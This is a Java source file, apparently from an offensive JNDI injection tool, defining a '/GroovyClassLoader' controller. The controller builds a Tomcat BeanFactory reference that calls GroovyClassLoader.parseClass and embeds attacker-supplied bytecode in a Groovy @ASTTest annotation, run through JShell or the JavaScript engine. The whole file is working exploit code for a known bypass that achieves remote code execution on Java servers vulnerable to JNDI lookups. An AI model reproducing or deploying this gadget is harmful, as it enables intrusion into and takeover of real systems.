package map.jndi.controller.bypass;

import map.jndi.Main;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.payload.JShellPayload;
import map.jndi.payload.JavaScriptPayload;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/GroovyClassLoader")
public class GroovyClassLoaderController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + GroovyClassLoader");

        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));

        if (Main.config.jshell) {
            String code = JShellPayload.loadClass(byteCode);
            String script = "@groovy.transform.ASTTest(value={\n" +
                    "    assert Class.forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"" + code.replace("\"", "\\\"") + "\")\n" +
                    "})\n" +
                    "class Person {\n" +
                    "}";
            ref.add(new StringRefAddr("x", script));
        } else {
            String code = JavaScriptPayload.loadClass(byteCode);
            String script = "@groovy.transform.ASTTest(value={\n" +
                    "    assert Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")\n" +
                    "})\n" +
                    "class Person {\n" +
                    "}";
            ref.add(new StringRefAddr("x", script));
        }

        return ref;
    }
}
